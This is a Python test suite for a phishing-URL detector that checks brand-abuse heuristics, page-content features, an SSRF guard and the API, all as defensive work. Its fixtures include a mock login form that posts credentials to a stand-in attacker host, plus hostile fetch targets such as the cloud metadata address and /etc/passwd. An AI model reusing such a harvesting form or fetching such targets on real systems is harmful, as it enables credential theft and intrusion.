"""Run:  python -m unittest discover -s tests -v   (no network needed - external calls are mocked)"""
import os
import sys
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from phishguard import content, intel
from phishguard.predictor import PhishGuard
from phishguard.urlfeatures import brand_analysis, host_features, is_ip_host, path_signals, registered_domain

LOGIN_HTML = """<html><head><title>Sign in</title><meta name="viewport" content="width=device-width">
<link rel="icon" href="/f.ico"><link rel="stylesheet" href="a.css"></head><body>
<form action="https://collector.evil.example/post" method="post"><input type="text" name="u">
<input type="password" name="p"><input type="hidden" name="t" value="1"><input type="submit"></form>
<a href="#">x</a><a href="/home">home</a><a href="https://other.example/x">ext</a>
<a href="https://facebook.com/page">fb</a><script src="a.js"></script><iframe src="x"></iframe>
<p>&copy; 2025 Example bank login</p></body></html>"""


class TestHostFeatures(unittest.TestCase):
    def test_registered_domain(self):
        self.assertEqual(registered_domain("mail.google.co.in"), ("mail", "google", "co.in"))
        self.assertEqual(registered_domain("a.b.example.com"), ("a.b", "example", "com"))

    def test_ip_forms(self):
        for h in ("192.168.1.1", "3232235777", "0xC0A80001"):
            self.assertTrue(is_ip_host(h), h)
        self.assertFalse(is_ip_host("example.com"))

    def test_brand_abuse_detected(self):
        self.assertEqual(brand_analysis("secure-login-update-paypal.com")["brand_in_sld_combo"], 1)
        self.assertEqual(brand_analysis("login.microsoftonline.com.account-verify.top")["brand_in_subdomain"], 1)
        self.assertEqual(brand_analysis("paypa1.com")["homoglyph"] + brand_analysis("paypa1.com")["typosquat"] > 0, True)
        self.assertEqual(brand_analysis("gooogle.com")["typosquat"], 1)

    def test_owned_domains_not_flagged(self):
        for h in ("www.paypal.com", "login.microsoftonline.com", "accounts.google.com", "mail.google.com"):
            r = brand_analysis(h[4:] if h.startswith("www.") else h)
            self.assertEqual(sum(r[k] for k in ("brand_in_subdomain", "brand_in_sld_combo", "typosquat", "homoglyph")), 0, h)

    def test_www_is_ignored(self):
        self.assertEqual(host_features("https://www.example.com")["n_subdomains"], 0)
        self.assertEqual(host_features("https://example.com/a/b/c?x=1")["host_len"], host_features("https://www.example.com")["host_len"])


class TestPathSignals(unittest.TestCase):
    def names(self, u):
        return {s["name"] for s in path_signals(u)}

    def test_at_trick(self):
        self.assertIn("userinfo_in_url", self.names("http://paypal.com@evil.example/x"))

    def test_embedded_and_keywords(self):
        n = self.names("https://example.com/redirect?u=http://evil.example/login/verify/account")
        self.assertIn("embedded_url", n)
        self.assertIn("path_keywords", n)

    def test_clean_deep_link_has_no_signals(self):
        self.assertEqual(self.names("https://github.com/pallets/flask/issues/1"), set())


class TestContent(unittest.TestCase):
    def test_extraction(self):
        f = content.extract_content_features(LOGIN_HTML, "http://victim-login.example/", 1)
        self.assertEqual(f["HasPasswordField"], 1)
        self.assertEqual(f["HasExternalFormSubmit"], 1)
        self.assertEqual(f["HasHiddenFields"], 1)
        self.assertEqual(f["HasFavicon"], 1)
        self.assertEqual(f["HasSocialNet"], 1)
        self.assertEqual(f["NoOfiFrame"], 1)
        self.assertEqual(f["NoOfJS"], 1)
        self.assertEqual(f["NoOfEmptyRef"], 1)
        self.assertEqual(f["NoOfExternalRef"], 2)
        self.assertEqual(f["NoOfURLRedirect"], 1)
        self.assertEqual(set(f), set(content.CONTENT_FEATURES))

    def test_ssrf_guard(self):
        for u in ("http://127.0.0.1/", "http://localhost:8080/", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"):
            with self.assertRaises(content.UnsafeTarget, msg=u):
                content.safe_fetch(u)


class TestPredictor(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.g = PhishGuard()

    def test_offline_obvious_phish(self):
        r = self.g.assess("http://secure-login-update-paypal.com", live=False)
        self.assertIn(r["verdict"], ("PHISHING", "SUSPICIOUS"))
        self.assertTrue(r["explanation"])

    def test_offline_legit_deep_links(self):
        for u in ("https://github.com/pallets/flask/issues/4500", "https://mail.google.com/mail/u/0/#inbox",
                  "https://en.wikipedia.org/wiki/Phishing"):
            self.assertEqual(self.g.assess(u, live=False)["verdict"], "LEGITIMATE", u)

    def test_free_hosting_not_confirmed_from_host_alone(self):
        r = self.g.assess("https://someones-blog.wordpress.com/post", live=False)
        self.assertNotEqual(r["verdict"], "PHISHING")
        self.assertIn("free_hosting", {s["name"] for s in r["signals"]})

    def test_brand_allowlist_caps_score(self):
        r = self.g.assess("https://netbanking.hdfcbank.com/netbanking/", live=False)
        self.assertEqual(r["verdict"], "LEGITIMATE")

    def test_threat_intel_hit_overrides(self):
        fake = {"whois": {"status": "ok", "age_days": 3, "created": "2026-10-07", "registrar": "X", "source": "RDAP"},
                "dns": {"status": "ok", "resolves": True, "ips": ["8.8.8.8"]},
                "tls": {"status": "skipped"},
                "threat_intel": [{"source": "OpenPhish", "status": "listed", "detail": "x"}]}
        with mock.patch.object(intel, "enrich", return_value=fake):
            r = self.g.assess("http://totally-fine-looking.example", live=True, fetch_page=False)
        self.assertEqual(r["verdict"], "PHISHING")
        self.assertGreaterEqual(r["final_score"], 0.99)
        self.assertIn("domain_very_new", {s["name"] for s in r["signals"]})

    def test_unavailable_feeds_are_not_clean(self):
        fake = {"whois": {"status": "unavailable"}, "dns": {"status": "unavailable"}, "tls": {"status": "skipped"},
                "threat_intel": [{"source": "OpenPhish", "status": "unavailable", "detail": "net down"}]}
        with mock.patch.object(intel, "enrich", return_value=fake):
            r = self.g.assess("https://www.example.org", live=True, fetch_page=False)
        self.assertNotIn("threat-intelligence", r["reason"])

    def test_full_model_used_when_page_fetched(self):
        page = {"html": LOGIN_HTML, "final_url": "http://victim-login.example/", "n_redirects": 0, "status": 200,
                "content_type": "text/html"}
        fake = {"whois": {"status": "unavailable"}, "dns": {"status": "ok", "resolves": True, "ips": ["8.8.8.8"]},
                "tls": {"status": "skipped"}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=fake), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("http://victim-login.example/", live=True)
        self.assertIn("full", r["model_used"])
        self.assertIn("external_form_submit", {s["name"] for s in r["signals"]})
        self.assertIn("password_over_http", {s["name"] for s in r["signals"]})

    def test_blocked_page_is_not_judged_by_content(self):
        """Regression: a Cloudflare 403 challenge page made claude.ai/login score 92% PHISHING."""
        page = {"html": "<html><head><title>Just a moment...</title></head><body><script src='/cdn-cgi/challenge-platform/x.js'></script></body></html>",
                "final_url": "https://www.example.org/login", "n_redirects": 0, "status": 403, "content_type": "text/html"}
        fake = {"whois": {"status": "ok", "age_days": 3000, "created": "2018-08-04", "registrar": "X", "source": "RDAP"},
                "dns": {"status": "ok", "resolves": True, "ips": ["8.8.8.8"]}, "tls": {"status": "skipped"}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=fake), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("https://www.example.org/login", live=True)
        self.assertIn("host-only", r["model_used"])
        self.assertIn("403", r["page"]["error"])
        self.assertNotEqual(r["verdict"], "PHISHING")

    def test_blocked_page_on_new_domain_is_not_cleared(self):
        """A phishing site that hides behind a block/challenge page must not be auto-cleared."""
        page = {"html": "<html><head><title>Just a moment...</title></head><body></body></html>",
                "final_url": "https://www.example.org/", "n_redirects": 0, "status": 403, "content_type": "text/html"}
        young = {"whois": {"status": "ok", "age_days": 5, "created": "2026-10-24", "registrar": "X", "source": "RDAP"},
                 "dns": {"status": "ok", "resolves": True, "ips": ["8.8.8.8"]}, "tls": {"status": "skipped"}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=young), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("https://www.example.org/", live=True)
        self.assertNotEqual(r["verdict"], "LEGITIMATE")
        self.assertIn("page_not_viewable", {s["name"] for s in r["signals"]})

    def test_blocked_page_age_unknown_is_not_cleared(self):
        page = {"html": "", "final_url": "https://www.example.org/", "n_redirects": 0, "status": 403, "content_type": "text/html"}
        unknown = {"whois": {"status": "unavailable"}, "dns": {"status": "ok", "resolves": True, "ips": ["8.8.8.8"]},
                   "tls": {"status": "skipped"}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=unknown), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("https://www.example.org/", live=True)
        self.assertNotEqual(r["verdict"], "LEGITIMATE")

    def test_form_page_still_analysed_not_discarded(self):
        """Credential-harvesting pages (forms present) must reach the content model."""
        page = {"html": LOGIN_HTML, "final_url": "http://victim-login.example/", "n_redirects": 0, "status": 200, "content_type": "text/html"}
        fake = {"whois": {"status": "unavailable"}, "dns": {"status": "ok", "resolves": True, "ips": ["8.8.8.8"]},
                "tls": {"status": "skipped"}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=fake), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("http://victim-login.example/", live=True)
        self.assertIn("full", r["model_used"])
        self.assertNotIn("page_not_viewable", {s["name"] for s in r["signals"]})

    def test_js_shell_not_judged_by_content(self):
        ok, why = content.page_usable({"status": 200, "html": "<html><head><title>App</title></head><body><div id='root'></div><script src='a.js'></script></body></html>"})
        self.assertFalse(ok)
        self.assertIn("JavaScript", why)

    def test_real_login_page_still_usable(self):
        self.assertTrue(content.page_usable({"status": 200, "html": LOGIN_HTML})[0])

    def test_falls_back_to_host_model_when_unreachable(self):
        fake = {"whois": {"status": "unavailable"}, "dns": {"status": "ok", "resolves": False, "ips": []},
                "tls": {"status": "skipped"}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=fake), \
             mock.patch.object(content, "safe_fetch", side_effect=content.UnsafeTarget("DNS resolution failed")):
            r = self.g.assess("http://gone.example/", live=True)
        self.assertIn("host-only", r["model_used"])
        self.assertIn("error", r["page"])


class TestIntelParsing(unittest.TestCase):
    def test_rdap_parsing(self):
        resp = mock.Mock(status_code=200)
        resp.json.return_value = {"events": [{"eventAction": "registration", "eventDate": "2020-01-01T00:00:00Z"}],
                                  "entities": [{"roles": ["registrar"], "vcardArray": ["vcard", [["fn", {}, "text", "Example Registrar"]]]}]}
        with mock.patch.object(intel.requests, "get", return_value=resp):
            r = intel.domain_age("www.example.com")
        self.assertEqual(r["status"], "ok")
        self.assertEqual(r["registrar"], "Example Registrar")
        self.assertGreater(r["age_days"], 365)

    def test_phishtank_listed(self):
        resp = mock.Mock()
        resp.json.return_value = {"results": {"in_database": True, "valid": True}}
        with mock.patch.object(intel.requests, "post", return_value=resp):
            self.assertEqual(intel.check_phishtank("http://x.example")["status"], "listed")

    def test_feed_failure_is_unavailable(self):
        with mock.patch.object(intel, "_load_openphish", side_effect=RuntimeError("offline")):
            self.assertEqual(intel.check_openphish("http://x.example")["status"], "unavailable")


class TestAPI(unittest.TestCase):
    def setUp(self):
        import api
        self.c = api.app.test_client()

    def test_predict_ok(self):
        r = self.c.post("/api/predict", json={"url": "http://verify-account-bank-login.xyz", "live": False})
        self.assertEqual(r.status_code, 200)
        self.assertIn(r.get_json()["verdict"], ("PHISHING", "SUSPICIOUS"))

    def test_bad_requests(self):
        self.assertEqual(self.c.post("/api/predict", json={}).status_code, 400)
        self.assertEqual(self.c.post("/api/predict", json={"url": "http://"}).status_code, 400)

    def test_dashboard_and_metrics(self):
        self.assertEqual(self.c.get("/").status_code, 200)
        self.assertIn("feature_sets", self.c.get("/api/metrics").get_json())


if __name__ == "__main__":
    unittest.main()
